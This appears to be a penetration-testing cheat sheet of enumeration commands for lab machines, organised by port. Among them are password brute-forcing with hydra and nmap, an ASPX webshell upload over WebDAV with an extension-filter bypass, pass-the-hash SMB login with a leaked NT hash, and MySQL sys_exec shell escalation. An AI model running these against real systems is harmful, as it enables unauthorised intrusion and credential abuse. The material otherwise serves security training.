# Network enum




## Discover Hosts
### IP: Netdiscover
    # netdiscover -r 192.168.206.0/24


### Netbios: Nbtscan
    Scan for Netbios Hosts
    Url: http://www.inetcat.org/software/nbtscan.html
    # nbtscan 192.168.206.0/24




=============================================================
## Port scanner
### Nmap
    # nmap -sV -A  192.168.206.23
    # nmap -sV -sC -p- 10.10.10.93
        -sV : Attempts to determine the version of the service running on port
        -sC : Scan with default NSE scripts. Considered useful for discovery and safe
        -A   : Enables OS detection, version detection, script scanning, and traceroute
        -p-  : Port scan all ports
        -oN nmap.log : output normal file
          

### Unicornscan 
    unicorn

### One Two Punch
    Use unicorn to scan open ports, then nmap to identify services
    https://github.com/superkojiman/onetwopunch


### Nmap + masscan
    masscan -p1-65535 10.10.10.71 --rate=1000 -e tun0 > ports
    ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
    nmap -Pn -A -p$ports 10.10.10.71

## Tools for ports
http://www.0daysecurity.com/penetration-testing/enumeration.html

=============================================================
## 21: Ftp

Check anonymous access
````
anonymous       anonymous
````

Use nmap script
````
nmap --script=ftp-anon.nse 10.10.10.9
````

Hydra password list
````
# hydra -t 1 -l admin -P /root/Desktop/password.lst -vV 192.168.1.1 ftp
````

Msfconsole scanner
````
# ./msfconsole -x “use auxiliary/scanner/ftp/anonymous; set ConnectTimeout=1; set FTPTimeout=1; set RHOSTS=xxx.xxx.xxx.0/19; run”
Note : for large network : set variable THREADS increase perf
````

Msfconsole password list
````
> use auxiliary/scanner/ftp/ftp_login
````    

Mirror the site
```
wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally.htb.local'
```

    

=============================================================
## 22: Ssh
### Hydra
    # hydra -l root -e nsr -V -o hydra.log -t8 -f ssh://raven.local
    hydra -l (found_name) -P password.lst 192.168.168.168 ssh
    hydra -L username_list.txt -P password_list.txt 192.168.168.168 ssh -t 4
=============================================================
## 23: Telnet
    # nmap -p 23 --script telnet-brute --script-args userdb=users.lst,passdb=/usr/share/john/password.lst,telnet-brute.timeout=8s <target>

=============================================================
## 53: Bind

Reverse DNS
	
	$ dig -x 10.13.37.10 @10.13.37.10
	=> fqdn


DNS Zone Transfert (axfr)
Permet d'obtenir des noms dns qui seront utilisés pour le routage des serveurs web.

```
# dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.11.4-P2-3-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 29 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: dim. sept. 08 11:47:44 CEST 2019
;; XFR size: 7 records (messages 1, bytes 203)
```







=============================================================
## 80: HTTP

### Magic files
    /robots.txt
    Comments in the HTML source code.


### Nman Enum script
    $ nmap -script http-enum.nse -p80 192.168.168.168

### Dirbuster
    Find hidden files & dir
    https://github.com/digination/dirbuster-ng
    # dirb http://10.10.10.93
    # dirb http://10.10.10.93/aspnet_client/system_web/ fuzz.txt -r                        : -r dont search recurvively
    # dirb http://10.10.10.93/ /usr/share/wordlists/dirb/common.txt -r
    # dirb http://10.10.10.24/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt



### Nikto
    Identify server
    https://github.com/sullo/nikto
    $ nikto -host xxx
    $ nikto -h 192.168.168.168 -p (port)

### Gobuster
    Find hidden files & dir
    https://github.com/OJ/gobuster
    wget https://github.com/OJ/gobuster/releases/download/v3.0.1/gobuster-linux-amd64.7z

    directory-list-2.3-medium.txt : assez longue
    /opt/gobuster/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.27.142  -l -x html,php,js,txt

    HTTPS: -k : skipp ssl verification
    
    common.txt : plus rapide
    # /opt/gobuster/gobuster dir -u http://10.10.10.13  -l -x html,php,js,txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt


    # gobuster -u http://172.16.27.142/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x html,php -s 200,301,401,403
    # ./gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.27.142  -l -x html,php,js,txt
    # gobuster -u http://192.168.168.168/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s 200,204,301,302,307,403,500 –e

### Curl
    curl http://192.168.168.168/admin.php?action=users&login=0

    
### Web server Common Directories
    https://github.com/digination/dirbuster-ng/tree/master/wordlists
    IIS : https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt
    Kali Dictionaries:
    /usr/share/wordlists/dirb/common.txt
    /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Cewl
    Get word list from web site
    $ cewl http://192.168.168.168/index.html -m 2 -w cewl.lst


### wfuzz

    Si touts les url retournent un 200 OK, on fuzz sur la longueur de la réponse
    # wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bart.htb/FUZZ/
    000018:  C=200    630 L     3775 W        158607 Ch       "2006"
    000017:  C=200    630 L     3775 W        158607 Ch       "download"
    000026:  C=200    630 L     3775 W        158607 Ch       "about"
    => 158607

    # wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bart.htb/FUZZ/ --hh 158607
    ==================================================================
    ID      Response   Lines      Word         Chars          Payload
    ==================================================================

    000014:  C=302      0 L        0 W            0 Ch        ""
    000067:  C=200    548 L     2412 W        35529 Ch        "forum"
    001614:  C=200     80 L      221 W         3423 Ch        "monitor"


### Bruteforce HTTP Basic Auth
    
    hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f 10.10.10.157 http-get /monitoring


### Screenshot of url

    wkhtmltoimage url pngfile 


=============================================================

## Sharepoint
### Directory listing
    wget https://github.com/danielmiessler/SecLists/archive/master.zip
    /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt 

### Well known : _layouts/viewlsts.aspx 
    http://10.10.10.59/_layouts/viewlsts.aspx   : liste des répertoires
    http://1tally/_layouts/viewlsts.aspx        : Utiliser un FQDN, sinon pages redirigées vers l'accueil..


=============================================================

## Wordpress
### Wpscan
    # wpscan -u http://raven.local/wordpress -e
    Note : mysql Credentials location: /var/www/html/wordpress/wp-config.php
    wpscan --url http://forum.bart.htb/ -e


#### Dir structure
  Posts :          /index.php/2017/04/12/hello-world/
                   /index.php/jobs/apply/8/
  Uploaded files : /wp-content/uploads/%year%/%month%/%filename% 

=============================================================

## Glassfish

=============================================================

## Joomla

    # joomscan -u http://10.10.10.18

=============================================================

## IIS Versions
````
IIS 1.0	Windows NT 3.51
IIS 2.0	Windows NT 4.0
IIS 3.0	Windows NT 4.0 SP3
IIS 4.0	Windows NT 4.0 Options Pack
IIS 5.0	Windows 2000
IIS 5.1	Windows XP Professional x32
IIS 6.0	Windows Server 2003
IIS 6.0	Windows Server 2003 R2  : with WebDAV CVE 2017-7269
IIS 6.0	Windows XP Professional x64
IIS 7.0	Windows Vista
IIS 7.0	Windows 7
IIS 7.0	Windows Server 2008
IIS 7.5	Windows Server 2008 R2
IIS 8.0 Windows Server 2012 and Windows 8
IIS 8.5 Windows Server 2012 R2 and Windows 8.1.  : pas de MS-XX ?
IIS 10.0 version 1607 a.k.a. version 10.0.14393 : Windows Server 2016 released 2016-09-26 and Windows 10 Anniversary Update released 2016-08-02.
IIS 10.0 version 1709 : Windows Server, version 1709 (Semi-Annual Channel) and Windows 10 Fall Creators Update both released 2017-10-17.
IIS 10.0 version 1809 a.k.a. version 10.0.17763 : Windows Server 2019 and Windows 10 October Update released 2018-10-02. 
````
=============================================================

## WebDAV

Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hypertext Transfer Protocol (HTTP) that allows clients to perform remote Web content authoring operations.
    Apache HTTP Server provides WebDAV modules based on both davfs and Apache Subversion (svn).
    Microsoft's IIS has a WebDAV module.
    Nginx has a very limited optional WebDAV module[4] and a third-party module[5]
    SabreDAV is a PHP application that can be used on Apache or Nginx in lieu of their bundled modules
    ownCloud is a cloud storage PHP application which offers full WebDAV support[6]
    Nextcloud is a fork of ownCloud, and therefore also offers full WebDAV support[7]
    lighttpd has an optional WebDAV module[8]
    Caddy has an optional WebDAV module[9]

### Davtest
    Testing tool for WebDAV servers
    $ davtest –url http://(target IP) – will display what is executable


### Cadaver
    A command-line WebDAV client for Unix. 
    cadaver http://(target IP), then run “ls” to list directories found
    ls
    get file.txt
    put local.txt distant.txt   

    PUT can filtered on extension ex: .aspx
    put /usr/share/webshells/aspx/cmdasp.aspx shell.txt
    move shell.txt shell.aspx


=============================================================

## Drupal
### Droopescan
    https://github.com/droope/droopescan
    pip install droopescan
    droopescan scan drupal -u http://10.10.10.9   (15 min scan...)

=============================================================

## Crawl php server
    python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.9/ -e php -x 403,404 -t 50
    Look for : 
    phpinfo.php
    /phpliteadmin
    /dashboard
    /admin
    /admin.php
    /login
    /login.php

=============================================================

## Ruby on Rail





=============================================================
## 137-139-445 : NetBios/Smb

### Nmap scripts
    nmap 192.168.168.168 --script=smb-vuln*.nse 
    location: /usr/share/nmap/scripts/smb-vuln*.nse


### Enum4Linux
    enum4linux 192.168.168.168  
    enum4linux 192.168.168.168 -U   : grab userlist

### Smbclient list
    lists smb type (often displaying samba version) and various shares
    smbclient -N -L 192.168.168.168 - 
    # smbclient -L 10.10.10.134
    Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC


### Smbclient browse
    $ smbclient '//host/folder' -U user --pass password
    smb: \folder\> recurse ON
    smb: \folder\> prompt OFF
    smb: \folder\> lcd /local/source/directory
    smb: \folder\> cd remote/target/directory
    smb: \folder\> mput *
                   mget *
                   get xxx
                   put xxx

### Mount SMB
    Install apt
    sudo apt-get install cifs-utils
    Mount point
    sudo mkdir /mnt/local_share
    Mount without login
    sudo mount -t cifs  //10.10.10.134/Backups /mnt/local_share
    Mount with authent
    sudo mount -t cifs -o user=<user on VPSA> //10.10.10.134/Backups /mnt/local_share

### Accesschk
    Attempts to connect to $IPC or $ADMIN shares
    accesschk -v -t (target IP) -u user -P /usr/share/dirb/wordlists/common.txt 

### Mount linux share
    rdesktop -u username -p password -r disk:share=/home//Desktop 192.168.168.168




=============================================================
## 389 : LDAP

    nmap -p 389 --script *ldap* 10.10.10.107

    Can leak Hash usables for SMB
    uid: alice1978
    objectClass: sambaSamAccount
    sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
    smbclient -L \\\\10.10.10.107 --pw-nt-hash -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B


=============================================================
## 1521/tcp  open  oracle-tns   Oracle TNS listener

- https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573

    ODAT (Oracle Database Attacking Tool) : https://github.com/quentinhardy/odat

    - You have an Oracle database listening remotely and want to find valid SIDs and credentials in order to connect to the database
    - You have a valid Oracle account on a database and want to escalate your privileges to become DBA or SYSDBA
    - You have a Oracle account and you want to execute system commands (e.g. reverse shell) in order to move forward on the operating system hosting the database
    - Tested on Oracle Database 10g, 11g, 12c and 18c

    Stand alone : 
    - https://github.com/quentinhardy/odat/releases/
    - https://github.com/quentinhardy/odat/releases/download/2.3/odat-linux-libc2.5-x86_64-v2.3.zip


    Identify Database
    - nmap

    Get SID
    - odat sidguesser -s 10.10.10.82
    - /opt/odat/odat sidguesser -s 10.10.10.82 -p 1521 --sids-file /opt/odat/accounts/sid.txt  --sid-charset ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz    Si rien trouvé,on ajoute les minuscules
    - msf auxiliary(admin/oracle/sid_brute) > run

    Bruteforce user and pass
    - ODAT password list is in all caps. Need to process or add new lists.
    - cp /usr/share/wordlists/metasploit/oracle_default_userpass.txt . then replace space by / =>  LOGIN/PASS
    - ./odat-libc2.5-x86_64 passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/msf_oracle_default_userpass.txt 
      - XE found by odat sidguesser




=============================================================
## 3000 : Node JS

### xxx



=============================================================
## 3306 : MySQL

### sqsh
    $ apt-get install sqsh freetds-bin freetds-common freetds-dev
    Add to the bottom of freetds.conf:
        [hostname] host = 192.168.168.169
        port = 2600
        tds version = 8.0
    edit ~/.sqshrc:
        \set username=sa
        \set password=password
        \set style=vert
    $ sqsh -S hostname
    select sys_exec('/bin/bash');
    (escalation: bash -p or sudo su)


========================================================================
#  UDP
========================================================================


=============================================================
## 69: TFTP (UDP)

    tftp 10.10.10.21
    Interactive : ? 
    Commandline -> brute force files & dirs..
        - msf > use auxiliary/scanner/tftp/tftpbrute
        - nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=customlist.txt <host>
        - A tester : python https://github.com/EnableSecurity/tftptheft

        
=============================================================
## 161 : SNMP (UDP)

### Snmpwalk
    snmpwalk -c public -v1 192.168.168.168



```
Voir HTB-conceal

snmpwalk -v 2c -c public 10.10.10.116

I could look up iso.3.6.1.2.1.1.4 (https://www.alvestrand.no/objectid/1.3.6.1.2.1.1.4.html) and see that it is sysContact,

Enable MIB support for snmpwalk
(for details, see the Mischief post: https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#background), 

First, install the mibs-downloader:
# apt install snmp-mibs-downloader
go into /etc/snmp/snmp.conf and comment out the only uncommented line to use the mibs.
# snmpwalk -v 2c -c public 10.10.10.116
# snmp-check -v2c -c public 10.10.10.116
```
IPv6 interfaces ?
```
snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.3
```
